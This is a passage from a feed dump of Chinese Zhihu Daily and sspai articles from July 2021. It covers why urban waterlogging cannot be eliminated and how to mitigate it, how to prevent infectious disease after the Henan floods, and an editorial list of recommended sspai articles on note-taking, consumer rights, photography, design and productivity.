src=\"https://pic2.zhimg.com/v2-680c7e9bf331b6b0319ffc714eb19e31_l.jpg?source=8673f162\"><span>刘志泉，</span><span>教师</span>\n<a href=\"https://www.zhihu.com/question/473593315/answer/2010561010\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我记得 19 年参加一个海绵城市会议的时候，忘了当时哪个设计院总工在做分组报告的时候直接说：“从某种程度上讲，城市内涝是不可避免的，无论我们采用什么样的技术手段，内涝都可能发生”。</p>\n<p>别忘了会议主题是海绵城市，讨论的就是洪涝问题，这位的言论可以说是当着几百号专家的面打脸，隐含的意思是做啥的都白费，肯定会涝，那么这几百人在这干嘛，喝茶吗？</p>\n<p>可是会场上大部分人的反应却是忍不住笑了，然后窃窃私语，甚至有人鼓掌的，说明大家对比心知肚明，只是没人像这位专家那么直白，把底都揭开摆台面上罢了。而事实上城市内涝确实屡屡发生，这次郑州的情况也印证了人家的观点。</p>\n<p>内涝无法根本解决我想主要有三点原因：</p>\n<p>1 城市面积增加，导致排水压力不断增加。降雨量是单位面积上降雨的深度，也就是降雨量一定的情况下，一根管道负责的排水区域越大，所需要的排水量就会越多，管道就要越粗。当然，这并不是成比例增加，因为区域越大，汇水时间也就越久，使得最大流量被一定程度上削减了，但是总体上仍然是增加的趋势。</p>\n<p>我国目前除了几个一线城市之外，仍然处于快速城市化阶段，意味着人口不断向城市流动，城市化面积不断增加，大量自然垫面被改造成硬化路面，屋面，一些河流被改直，天然洼地，池塘被填平，大量原来能够通过自然下渗的雨量也需要被排水系统转运到最终受纳水体中。客观上，随着城市化进行，排水系统就不得不增加泄洪能力以满足不断提升的排水需求。越大的城市需要排掉的雨水就越多，最终所有压力都汇集到几条主干管上。</p>\n<p>2 管道的管径不可能无限增大。首先，管道强度不支持无限放大管径。蚂蚁能举起自身几十倍重量的物体，可是蚂蚁放大到人这么大的时候，它还能做到吗？它身体的强度已经不足以支持自身体重几十倍重量所产生的压力，自然没办法继续当大力士！对管道也是如此，常见的混凝土管越大，需要的强度就越高以便承担上覆土和道路车辆产生的荷载，总会有个上限存在，好像目前钢筋混凝土管最大管径是 4 米。</p>\n<p>其次，即使有足够大的管道也不一定有空间放置。道路下面要铺设很多种管道，比如给水管，排水管，电线，网线，燃气管等，不同管道之间还有空间上的要求，水平方向和垂直方向都有最小间距要求，而且为了便于维修，一般还要把主行车道让开。所以即使是几十米宽的大马路也不一定能完美的把所有管道放进去。</p>\n<p>最后，经济因素限制了排水管径。很明显，管道越粗花钱就越多，提升设计标准当然一定程度上能缓解洪涝问题，但是你设计流量翻倍，管径就要扩大 50%，新区还好，老城区的管道怎么更新，钱是一方面，修管就要影响交通，带来的一系列间接影响怎么算？参考祖传代码所造成的“屎山”，只要能不动咱们就别动了吧！以前老的规范是要求管道排水重现期 1 年，现在提升到 3-5 年，后面即使再提升，到 10 年也就差不多了吧。一个城市下面那么多排水管，全更新维护可是天价了，而且也没有必要为了个别极端情况去无限扩大泄洪能力，毕竟内涝的危害和河坝水库决堤的危害不可同日而语，人家那可真是百年大计。</p>\n<p>3 受纳水体容纳能力限制。无论什么情况，最终汇集的雨水总要排放到水体中的，很多情况下，暴雨导致河水水位上涨使得依靠重力排水不畅，严重时候甚至出现河水倒灌的情况。这时候怎么把收集的雨水排出去就成了难题，雨水滞留就会导致上游排水不畅，就会出现内涝！现在有的地方会在主要排水口设置防倒灌阀门，河水水位过高时关闭阀门，启动大流量雨水泵强行抽水外排。可是即使水泵足够大，河水还可能超过河堤高度直接倒灌，比如这次河南，比如 19 年广州，又要怎么做？</p>\n<p>当然，我们有很多办法去缓解内涝问题，比如错峰排水，比如海绵城市建设，但是这些手段并不能解决根本问题，只要城市面积不断增加，只要暴雨足够大，内涝都会发生，哪怕是吹的不行的东京地下排水宫殿也没办法！</p>\n<p>最后再强调一次，彻底解决内涝是不太可能的，但是用技术缓解内涝的频率和降低内涝造成的损失是可能的，而且也是一定能做到的。</p>\n<p>希望河南挺住，希望所有灾区人们平安，希望所有坚持在抗洪第一线的战士和工作人员都安全归来！</p>\n<hr>\n<p>下班了，补充下我认为比较合适的防内涝措施。我并不是做这个方向的专家，如果大家对这方面感兴趣，可以看看中科院祝贵兵老师的一些研究论文，我认为他的一些观点是非常有可行性和实践价值的。</p>\n<p>暴雨产流过程其实就是雨落到地上一部分渗透到土地里面，超出土壤吸收能力的雨就会顺着地面流动，汇集在一起，越来越多，不断像地面低洼处流动这样一个过程，对某一点的地面径流来说，流量随时间变化大概遵从下面图黑线这样一个过程。纵坐标代表流量，曲线围成的面积代表地面径流的总水量。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-870bf2ee4ce52b97ce5ba569cd7a70db_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而城市化之后，大量土壤变成了路面，下渗作用几乎为 0，雨水主要通过路面径流汇集，再通过污水管道排放，整体上需要排放的水量增加，汇流时间降低，相应的最大流量就要明显增加，流量曲线就变成了橙色的样子（手画，看个大概即可）。</p>\n<p>而我们要降低最大流量，一方面是降低整体需要排的雨水量，另一方面是延长排水时间，使面积不变的情况下洪峰流量得到削减，也就是图中红色的示意。</p>\n<p>具体做法无非是从源头控制，汇流和转输削减，末端管理三个方面入手。</p>\n<p>在源头控制上，尽可能强化土壤入渗能力，什么绿色屋顶，雨水花园，下沉式绿地，透水铺装，等等常见海绵城市措施都可以用，此外小区还可以修建雨水池，把初期雨水存起来，等天晴了之后处理排放或者回用。别看这只是削减一点点，整个城市无数个一点点积累起来就是可观的数字。</p>\n<p>在汇流和转输上，一方面可以考虑延长汇水时间，有意识增加雨水在管道内的停留时间，另一方面可以在条件适宜的时候用植草沟，下渗铺装来替代传统的封闭管道，使水量在输送过程中得到削减。</p>\n<p>在输送和最终排水阶段，尽可能设置一些水景和池塘，它们可以当做暴雨时的缓冲，有效容纳一部分暴雨，降低短时间内排水的压力。这样也就延长了整体汇流的时间，降低了所需要的最大流量。</p>\n<p>同时，如果流域内每一个城市都尽量拖，延长排水时间，整个河流排水的压力就会降低，流域内就不容易发生洪涝灾害。咱们可以把流域比做一个城市，流域内每个城市比做一个个小区，流域内的水库比做城市内的各个水景，可以看到流域的情况和一个具体城市的情况是相通的，道理都是那个道理，无非就是降低需要排放的水量和延长排水的时间罢了。</p>\n<p>以上这些做法不仅有利于防内涝，对保护水环境也有很重要的意义，很多污染物在雨水输送过程中得到削减，排放到水环境的污染物减少了，水质自然就会变好。</p>\n<p>除了这些之外，尽量保护城市内河天然的河道，不要任意把河道改直，铺设不透水河底，对于防洪也很有意义。</p>\n<p>应该说这些手段本身并没有什么难的，大家想也能想到，但是怎么用，怎么样和城市整体发展结合起来，让城市既美观又实现防洪的需求就看设计师的功底了。</p>\n<p>此外，我对城市发展其实也有一点想法，盲目的搞超级城市其实带来很严重的环境问题，不如做成中心城市和卫星城市，中间保持适当的公路连接，这样每个城区面积小了，排水压力自然也小了，即使在最不利的情况下，像郑州这种极端天气，至少可以把过量的雨水排放到两城之间的过渡带去，农田和个别房屋的损失总好过瘫痪整座城市，损失也要小的多，国家赔偿也赔得起。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473593315\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738341"},{"title":"河南多地暴雨致灾，灾后是否有传染病传播的风险，如何防范？","date":"2021-07-21 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d3861223efd01108340677ef13c8dbf7_l.jpg?source=8673f162\"><span>元宿six，</span><span>专注医学干货和病房故事写作，有事联系微信songs233</span>\n<a href=\"https://www.zhihu.com/question/473630224/answer/2010754419\" hidden>阅读原文</a>\n</div>\n<div>\n<p>关于传染病传播的风险，这一点确实很容易被人所忽略。</p>\n<p><strong>为什么我们需要预防传染病呢？</strong></p>\n<p>郑州的暴雨已经造成严重的洪涝灾害，在这种情况下，内涝导致地下管道发生堵塞，垃圾大量堆积，严重污染环境水源，环境与卫生条件的恶化，较容易形成病菌生长繁殖的理想场所，使得菌源产生，形成传染源；</p>\n<p>恶劣的环境也导致人的精神紧绷，饮食不规律，容易导致人体抵抗力下降，特别是对已经生病的人或免疫系统衰弱的儿童和老年人而言，环境恶劣会进一步促进易感人群的形成；</p>\n<p>此外此时的空气和水体流动性较强，也使得病菌传播途径广泛，传播速度快；</p>\n<p>因此，在传染源，传播途径，易感人群三者都已潜在的情况下，暴雨中和暴雨后都需要格外警惕。</p>\n<p><strong>我们需要预防哪些疾病？</strong></p>\n<p>接触受污染的洪水可能会导致<sup>[1]</sup>：</p>\n<ol>\n<li>伤口感染（若本身无伤口的也要小心锐物造成破伤风）</li>\n<li>\n<strong>经胃肠道感染的传染病</strong>：这点最常见，可分成两类：（1）细菌性的有痢疾、伤寒副伤寒、霍乱、食物中毒等;（2）病毒性的有甲型肝炎、手足口病(其中儿童需要重视，多发生于 5 岁以下儿童，表现口痛、厌食、低热、手、足、口腔等部位出现小疱疹或小溃疡，多数患儿一周左右自愈，少数患儿可引起心肌炎、肺水肿等并发症，严重可危及生命)。</li>\n<li>经皮肤感染的传染病：钩端螺旋体病（在市区不常见），一种人畜共患细菌性疾病，传播通过皮肤和粘膜接触水、潮湿的土壤或植被（如甘蔗）或被啮齿动物尿液污染的泥浆而发生。虽然是洪灾后需要重点防范的传染病之一，发病者以青壮年、有接触疫水者为主，但是由于猪是洪水型钩体病流行的主要传染源，家畜和鼠类、蛙类等是次要传染源，在市区这些家畜较少<sup>[2]</sup>。相比这些，过敏性皮炎等一些皮疹更常见。</li>\n<li>虫媒传染病如流行性出血热，又称肾综合征出血热，以鼠类为主要传染源的自然疫源性疾病。以发热、出血、充血、低血压休克及肾脏损害为主要临床表现，此外还存在血吸虫某些线虫等传染病，但这些在内陆城市较少见。</li>\n</ol>\n<p><strong>如何预防这些疾病？</strong><strong>1.当你身处在暴雨或洪涝中：</strong><strong><strong>远离水源</strong></strong></p>\n<p><strong>无论污染源如何，保护自己免于暴露在洪水中是很重要的。保护自己的最好方法是远离水。</strong></p>\n<p>如果你接触到洪水：</p>\n<ul>\n<li>尽快用肥皂和清水清洗受伤的地方。如果你没有肥皂或水，请使用含酒精的湿巾或消毒剂。</li>\n<li>照顾好伤口，必要时就医。</li>\n<li>在重新使用之前，先用热水和洗涤剂清洗被洪水或污水污染的衣服<sup>[3]</sup>。</li>\n</ul>\n<p><strong>如果你必须进入洪水，请穿上橡胶靴、橡胶手套和护目镜。</strong></p>\n<p><strong><strong>尽量避免受伤</strong></strong></p>\n<p>洪涝中可能含有锋利的物体，例如玻璃或金属碎片，可能会造成伤害并导致感染。及时的急救可以帮助治愈小伤口并防止感染。</p>\n<p>如果你有刺伤或被粪便、土壤或唾液污染的伤口，请让医务人员根据个人记录确定是否需要注射破伤风抗毒素或其他免疫剂<sup>[4]</sup></p>\n<p><strong><strong>防止开放性伤口感染：</strong></strong></p>\n<p>暴露在洪水中的开放性伤口可能会被感染<sup>[5]</sup>。</p>\n<ul>\n<li>如果你有开放性伤口，请避免接触洪水。</li>\n<li>用防水绷带覆盖干净、开放的伤口，以减少感染的机会。</li>\n<li>用肥皂和清水彻底清洗，尽可能保持开放的伤口清洁。</li>\n<li>如果伤口发红、肿胀或渗出，请立即就医。</li>\n</ul>\n<p><strong>如果出现以下情况，请尽快就医：</strong></p>\n<ul>\n<li>伤口内嵌有异物（泥土、木头、金属或其他物体）；</li>\n<li>伤口有特别的感染风险（例如被狗咬伤或被脏物刺伤）；</li>\n<li>旧伤口显示出被感染的迹象（疼痛和酸痛加剧、肿胀、发红、渗液或发烧）。</li>\n</ul>\n<p><strong><strong>保护自己和家人免受腹泻病的侵害。</strong></strong></p>\n<p>请注意，洪水中可能含有污水，食用或饮用被洪水污染的任何东西都可能导致腹泻病（例如<em>大肠杆菌</em>或<em>沙门氏菌</em>感染）。为了保护自己和家人：</p>\n<ul>\n<li>接触洪水后要洗手。还要确保经常在饭前用肥皂和水清洗儿童的手。</li>\n<li>不要让儿童在洪水区玩耍。</li>\n<li>不要让孩子玩被洪水污染和没有消毒的玩具。</li>\n</ul>\n<p><strong>2.当灾情过后</strong></p>\n<p><strong>灾情过后，需要从传染源、传染途径、易感人群三个途径入手。</strong></p>\n<p>洪涝后，预防传染病的重要措施，对任何患有传染病的人和动物要尽可能做到早发现、早诊断、早报告、早治疗、早隔离，以防传染病蔓延。</p>\n<p>对于传染途径，尽快做好个人卫生和环境卫生，空气、水、饮食、微生物都属于传播媒介，粪 - 口途径是用于水源性疾病的疾病的传递路径，社区管理应尽快检查卫生设施。</p>\n<p>对于易感人群，特别是老、弱、幼以及病人，如果感觉身体不适时，要及时找医生诊治。特别是发热、腹泻病人，要尽快寻求医生帮助，对于普通人，灾情后，应保持皮肤清洁干燥，随身用毛巾等擦汗，做好个人卫生。</p>\n<p><strong>导致新冠病毒能否通过洪水传播给人类？</strong></p>\n<p>目前没有证据表明新冠病毒可通过水传播的人，虽然洪涝会与废水混合，但目前没有任何关于病毒通过吞咽或接触被感染者粪便污染的水传播的科学报告，更别说在疫情防控完好的地区。</p>\n<p>我们广大的医护人员和政府已经在救援的路上，如果出现文中类似的问题，请注意及时求助。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/473630224\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738335"},{"title":"不读可以先收藏 01 | 让这些好文章为你的稍后读加点料","date":"2021-07-21 09:16:58","description":"\n<h4><strong>不读可以先收藏</strong></h4>\n<p>让有价值的内容保持生命力，是对少数派作者分享和创作精神的肯定，对刚刚接触少数派的读者而言，这些内容也是方便他们直达少数派内容和 Matrix 社区核心价值的钥匙。</p>\n<p>在这个不定期更新的栏目中，少数派编辑部将人工挑选过去一段时间内值得重读和收藏的文章，这些内容凝聚了作者的耕耘和读者的肯定，应该能为想读好内容的你献上一份数字时代的「合订本」。</p>\n<hr>\n<p>大家好，今天是 2021 年 7 月 21 日。本栏目的第一期，我们从过去推荐到首页的 1500 篇文章中挑选了 N 篇文章。</p>\n<p>如果有你喜欢的好文章，不妨把文章末尾的收藏按钮用起来。</p>\n<h2>这些文章可以先收藏</h2>\n<h3>《年度征文｜文科博士生眼里的资料管理、阅读和笔记系统》</h3>\n<p>作者：<a href=\"https://sspai.com/u/chyixian/posts\" target=\"_blank\">chyixian</a></p>\n<p>充电量：358；收藏量：798</p>\n<blockquote>\n<p>笔记书、整理术乃至发想创造术，它的意义应该在于对整体性程序逻辑的改善，而一旦改变了底层逻辑，同样的方法和工具就可以运用于各个领域，从这种意义上才可成为方法性的 revolution。反过来说，一切不涉及底层逻辑革新的所谓「方法论」，最终会流向肤浅化的工具论。这也是在摸索方法中的我所需要自勉的。</p>\n<p><a href=\"https://sspai.com/post/64795\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（北鸮）</strong>：在少数派，笔记应用、知识管理类型的文章总是一大热门，也有不少读者迷失在茫茫多的文章列表中，看着一个个功能繁多特色各异的应用犯愁，不知如何下手，选什么下手。或许你需要的，正是一个可以跟着尝试、带你思考的决策流程，那么这篇文章大概能帮上你的忙。</p>\n<p>本文的作者是一名留学日本的文科在读博士。她以自己对阅读、笔记、整理知识流程的思考，创作了这篇详细记述个人工作流的分享文章。从发现问题，到提出方案，直至实行与最后的反思，每一个步骤，作者都做了清晰的解释。不管你是同样从事学术工作，还是有其他的笔记整理需求，都可以跟随她的思考路程一起探索自己的知识管理法则。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/01/27/2d4f1ef7181b40c259a1763176ca9cf6.png\" alt=\"\"></figure><h3>《买到扩容 iPad 不会维权？看看我怎么让卖家「退一赔三」》</h3>\n<p>作者：<a href=\"https://sspai.com/u/qmfming/posts\" target=\"_blank\">青苗法鸣</a></p>\n<p>充电量：472；收藏量：321</p>\n<blockquote>\n<p>可是我哪有这么好忽悠啊？在店铺的另一条链接的提问区和评论区，有非常多的人反映商品是扩容机（我之前没看到这个链接，百密一疏），说明我绝非个例。如果只有我一家到扩容机，确实有可能是供应商不厚道。现在一大堆人跳出来说有问题，说明店家是专门卖扩容机、靠坑蒙拐骗赚黑心钱的。发现并曝光问题的买家尚且有这么多，那那些没发现的呢？我都不敢想了。</p>\n<p>况且，在 3 月底的时候，我就跟卖家发出严正警告，又通过各种渠道投诉卖家，卖家无动于衷。四月初，我在评论区直接公开举报：此乃扩容机，把起诉书贴了上去，结果卖家直接把产品下架了，新建一个链接卖！呵呵，现在倒好，收到传票了，良心发现了？</p>\n<p><a href=\"https://sspai.com/post/67209\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Tp）</strong>：这是一篇少数派罕有的「爽文」，通篇读下来总会让人有热血沸腾的感觉。纵使抛开「读得爽」的特点，这篇文章也颇具可圈可点之处。无论是作者死磕到底的「折腾」精神，还是对维权流程的详细记录，都可以看出作者身为法学生对于法律严谨负责的态度。其中证据的收集、提交等过程，也具有一定的参考价值，可以应用到自身的维权当中去。</p>\n<p>交易纠纷或许是我们生活中难以避开的一个「大坑」，但许多人往往会选择忍气吞声，自认倒霉，让不法分子有了更多可乘之机。希望这篇文章可以让你重新燃起对「维权」的信心，拿起法律武器保护自己的权益。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/e913638c-adbf-4dfd-fb96-e81d5d0074ba.jpg\" alt=\"\"></figure><h3>《外出就餐，如何把食物拍得更好看》</h3>\n<p>作者：<a href=\"https://sspai.com/u/Microhoo/posts\" target=\"_blank\">Microhoo</a></p>\n<p>充电量：320；收藏量：352</p>\n<blockquote>\n<p>……那这时候你首先需要做到的两件事是坚持和真诚。前者顾名思义，后者则是拍摄食物就是拍摄食物，你可以附带告知这家好吃的店，可以尽力形容它的优秀，甚至可以罗列如何去制作它；但一定不是借机炫耀自己去了高级饭店，也不是想要用它衬托自己的美貌，更不是借其聊表心意——尊重它。</p>\n<p><a href=\"https://sspai.com/post/63848\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Clyde）</strong>：从这篇文章可以看出，和 Clyde 这种混脸熟打入内部的角色不同，小虎加入少数派编辑部全凭实力——开个玩笑，不过这篇文章背后的确是有故事的。</p>\n<p>因为当时的一篇社区文章，编辑部有了「如何才能把食物拍得好看」的讨论，在聊到这个选题时，我脑海中浮现的第一个作者其实不是别人，正是当时已经加入少数派编辑部的小虎；就像文章里所说，如果你在社交平台（尤其是某个以图片分享为主的社交平台）上关注了小虎，应该也会对文中「一看就是小虎拍的」这种感觉并不陌生。</p>\n<p>文中围绕外出拍摄食物这个话题所提供的思路——突出主体保持画面干净、通过整齐的画面表现丰盛感、捕捉和食物两相宜的诱人场景，都是在实际拍摄过程中拿起手机、打开相机就容易遗忘，若是想起则能有效提升成片效果的平实技巧。</p>\n<p>当然，最重要、也是留给我个人印象最深刻的还是上面摘录的那句话，更多的时候我们或许应该先摆正心态——拍摄食物不是借机炫耀、也不是用它衬托什么，尊重它并且赞美它就好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/12/01/2dd71b56e5af94c5e52192bdd72a5e4e.jpg\" alt=\"\"></figure><h3>《看了十张年度书单，我挑选出这 16 本不容错过的好书》</h3>\n<p>作者：<a href=\"https://sspai.com/u/y5gchf65/posts\" target=\"_blank\">蛋挞西瓜</a></p>\n<p>充电量：336；收藏量：607</p>\n<blockquote>\n<p>书业作为非基本生活必需之行业，在这次疫情中更是受到重创，许多出版社都难以为继，诚品书店深圳店也在 2020 年的最后一天关上了大门。一本书的面世，背后有着选题策划、编辑加工、装帧设计、宣传推广等一整套的出版流程，而新书的寿命只有三个月，没卖出去就再难见天日，书店上架两星期，不动销就下架，现在正是读者扫一眼、翻一下，就决定是否购买的快消时代。</p>\n<p>正所谓「风萧萧兮易水寒，各种标点各种难。垂死病中惊坐起，千万不要做编辑」，出版业的工资水平偏低，而且也不会成名，只是为他人做嫁衣。有时候图书的宣传还要帮着办办读书会、开开直播，让读者认识、了解新书。所谓鞍前马后，也就大概这个意思了吧。</p>\n<p>所以感谢这些站在一线的出版人，感谢那些坚守到最后的实体书店工作者，还要感谢一直与书作伴的「你们」，是大家的努力，是这一小撮人的喜爱和热忱，让世界再乱、环境再难，我们仍可以说出那句「但是还有书籍」。</p>\n<p><a href=\"https://sspai.com/post/64664\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（张奕源 Nick）</strong>：尽管我派读者中爱读书的朋友不少，但我们却很少系统地制作图书推荐类内容。图书推荐看似简单，但仔细筹划起来，从选书到撰写推荐语其实都不容易。蛋挞西瓜的这篇图书推荐以「年度书单」为底，同时涵盖了小说、社科、访谈、非虚构乃至漫画绘本等不同品类的书籍，既引入了各图书排行榜的综合排名，也融入了个人的阅读经历和感受，有态度，也有温度。</p>\n<p>蛋挞西瓜在文章结尾的这段话饱含对图书出版业的人文关怀，也体现出他本人对书籍和阅读的热爱。近期恰逢暑假假期，如果你正想选一本合适的好书读一读，这份书单值得一阅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/924491b3-12f5-b620-04de-e5b0960e4672.png\" alt=\"\"></figure><h3>《非设计师也该学的排版知识 01：视觉动线》</h3>\n<p>作者：<a href=\"https://sspai.com/u/gmvccwqi/posts\" target=\"_blank\">oooooohmygosh</a></p>\n<p>充电量：362；收藏量：363</p>\n<blockquote>\n<p>总之无论如何，读者的「视觉动线」必须在你的掌握之中，很多觉得自己排版杂乱无章的设计师其实就是因为在一开始便放弃了掌握视觉动线的权利。</p>\n<p>如果画面中的元素与要表达的内容过多，你就要先整理信息，梳理主次，确定版面中真正的视觉落点在哪里，并将剩余的元素划分段落，然后精心设计阅读顺序。</p>\n<p><a href=\"https://sspai.com/post/62392\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（广陵止息）</strong>：现代社会无论是谁都要和设计搭点边——学生时代要做宣传手册，找工作时要制作简历，工作时要做到 PPT。而懂一点设计常识不仅可以让做出来的东西更美观，还可以减少「试错」所需要的时间，加快你完成这些内容的速度，而这也是我推荐这篇内容的主要原因。</p>\n<p>本文并不从枯燥的理论出发讲解「视觉动线」这个概念。而是从实际的例子入手，生动形象地解释了为什么「视觉动线」、怎么做是正确的以及有什么好处，即使是对设计毫无基础常识的大多数读者来说也非常易于理解。文章中的例子也与日常生活里大家需要做的设计内容紧密关联，相信下次你再制作类似内容时也可以帮到你许多。</p>\n<p>当然，oooooohmygosh 的「非设计师」系列也不止这一篇文章，<a href=\"https://sspai.com/u/gmvccwqi/posts\" target=\"_blank\">其他文章</a> 同样也可以帮你认识到设计的重要性，让你的内容不仅实用也能变得好看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/5401fcd9-9f26-440d-745d-f6cc70548d54.png\" alt=\"\"></figure><h3>《用好 Keynote 和 iMovie，在 iPad 上做出有高级感的视频》</h3>\n<p>作者：<a href=\"https://sspai.com/u/b1yetc0l/posts\" target=\"_blank\">缝纫机动队</a></p>\n<p>充电量：315；收藏量：433</p>\n<blockquote>\n<p>最近看到越来越多的设计类自动化工具，可能某种程度上，过去那些需要较高学习成本的工作都可以轻松实现，并且精度也越来越接近手动，移动平台如果不出意外，大有在民间取代传统个人电脑的趋势，也让越来越多的普通人参与到设计和摄影当中。</p>\n<p>对于艺术创作来说，它变得更混乱了，而这对于许多人来说既是福祉，也是考验。</p>\n<p>最后纠正一下我之前说的「设计的核心是创意」，实际上我思考了一下以后觉得设计的核心可能是功能。</p>\n<p><a href=\"https://sspai.com/post/61882\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（waychane）</strong>：与其一直争论「iPad 是不是生产力工具」，不如思考如何用手中设备创造价值，本文作者「缝纫机动队」就是这样通过身体力行告诉我们，什么才是「别人家的 iPad」。不是设计师、也不是摄影师，更没有经过专业培训，只用随手可得的 iPad 和人人可用的 App，让静态图像「活」了起来。</p>\n<p>从「纯净度」和「陌生感」出发，本文介绍了几种常见动画效果的实现方法，人人都能学以致用，制作出具有「高级感」的视频内容。当然，读完本文，也希望你能从中获得灵感与思路，用好手中的 iPad，为自己创造价值。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/c21a4d68-c86d-2f64-9e0a-aeb1d5911271.gif\" alt=\"\"></figure><h3>《如何追求精力充沛的生活》</h3>\n<p>作者：<a href=\"https://sspai.com/u/zimpo3jv/posts\" target=\"_blank\">sainho</a></p>\n<p>充电量：457；收藏量：649</p>\n<blockquote>\n<p>在讨论「如何管理精力」时，我们绝不能简单地追求一个完美的解决方案，然后套用在自己身上。身体条件、睡眠、饮食、环境等因素的差异，让每个人只能从自己的情况出发，去选择适合自己的精力管理方式。</p>\n<p>除去客观因素的影响，我们自己的情绪也是导致精力错位原因之一。人本来就有畏难情绪，讨厌面对困难的任务。现在高度发达的互联网又让人容易产生「信息缺乏恐慌症」，所以早晨起床后先刷半小时的微博抖音醒一醒觉，开始工作后先和同事聊几句，看一圈自己感兴趣的网页等等行为，已经变成一天的常态。殊不知如此一来，自己已经从刚起床的满血状态逐渐下滑。</p>\n<p>为了克服情绪因素对精力的浪费，最直接的方法就是应对不同场景，将自己的行为流程化。预期通过内心对自己的要求，将行为流程化更容易实现，久而久之，自己的行为也会逐渐改善自己的情绪。</p>\n<p><a href=\"https://sspai.com/post/61722\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Lotta）</strong>：阅读精力管理的文章，并不是要照搬某个人的计划或方案，更多地是从中提取出较为普适的方法论，寻找到与自身情况相匹配的灵感或启发，这篇文章的写作目的与作用就在于此。文章从什么是精力开始，介绍了保持深度工作、克服精力浪费的方法，并从休息、睡眠、饮食三个方面提供了实用且易操作的小建议来提高精力上限。此外，文章中还提到了不少有关时间/精力管理的参考文章和书籍，丰富书单的同时也方便大家追本溯源，建立独属于自己的方法论。</p>\n<p>虽然文章中举出的多是作者在家办公的案例，但对于想合理利用下班时间来自我提升的工作党和暑假想要居家学习的学生党也同样适用。因为「由畏难情绪而导致精力错位」的现象，似乎在每个人身上都找得到它的影子。而「将自己的行为流程化」，安排一些轻松愉悦易完成的小事在开始和结束之前，也确实是一个改善情绪的好方法。当然前提是不要沉迷在这些小事里🌚。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/4cefb4cc-426a-afc4-b17d-0c3958c224dc.jpg\" alt=\"\"></figure><h2>值得关注的专栏内容</h2>\n<h3>《为什么中美互联网头部公司的业务是一一对应的？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/z28ec0rm/posts\" target=\"_blank\">王龙行</a></p>\n<p>充电量：6；收藏量：6</p>\n<blockquote>\n<p>在看纪录片《美国商业大亨传奇》的时候，第一次想到。这个纪录片只讲了美国最成功的商人，为什么是洛克菲勒、卡内基、摩根成为了商业巨头？</p>\n<p>因为他们都是在历史机遇中，抓住了某一项惠及到最普通大众人群的技术变革。洛克菲勒抓住了石油技术的应用，从照明到汽车都是最大众化的需求；卡内基抓住了工业社会的建筑和基建对现代钢铁技术的需求。</p>\n<p>而互联网，是石油、钢铁、汽车、电力之后的，又一个普惠最大众的人群的技术应用。而互联网技术的具体应用场景中，大众人群都需要的、不因国家-文化-语言-地区而区别的场景，就是电商、通讯与社交、搜索这几个。这就是中美互联网巨头一一对应的原因。</p>\n<p><a href=\"https://sspai.com/post/66947\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：<a class=\"ss-atUser\" data-mention=\"@王龙行\" user-id=\"bveph6k4o16dhal7rnn0\" href=\"https://sspai.com/u/z28ec0rm\">@王龙行</a> 曾在微博做PM，也有过七年的创业经历。他主理的专栏「<a href=\"https://sspai.com/column/265\" target=\"_blank\">newsletter 那些事</a>」，介绍自己正在用 newletter 这种阅读方式，来分享自己的内容创作经历。在专栏里，他会分享自己的碎片化思考、工作笔记、优质内容推荐，关注创业经验总结、对商业的思考、关注的创业故事与启发。</p>\n<p>在我看来，他的文章的价值不在于从中我能学到什么商业知识或是创业机会，而是去观察、模仿和学习他思考的方式，然后内化成自己的能力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/a40e926408255dc44042ef1d836c5f0c.jpg\" alt=\"\"></figure><h3>《DPS 周刊 01 - 如何努力？》</h3>\n<p>作者：<a href=\"https://sspai.com/u/evqgshj3/posts\" target=\"_blank\">DrSelfie</a></p>\n<p>充电量：1；收藏量：1</p>\n<blockquote>\n<p>技术公司和传统公司很不一样的一点就是内部的开放程度。Gergely Orosz 介绍了 Uber 在内部如何公开技术文档：<br>1. 在开发前做规划；<br>2. 把这个规划写成一个文档；<br>3. 在开始工作之前，让别人批准这个规划；<br>4. 将这份计划文件发给公司的所有工程师；<br>5. 让每个人都遵循上述步骤，除非是非常小的项目；<br>这样做的好处之一就是所有人都有机会了解这些项目，如果有建议或者意见也可以提出，降低了项目间可能的冲突，也降低了重复造轮子的可能性。</p>\n<p><a href=\"https://sspai.com/post/67756\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：</p>\n<p>如果你质疑「生产力」是一门玄学，欢迎你来看看 <a class=\"ss-atUser\" data-mention=\"@DrSelfie\" user-id=\"bs2pg3lb34tcs0poqv1g\" href=\"https://sspai.com/u/evqgshj3\">@DrSelfie</a> 主理的「<a 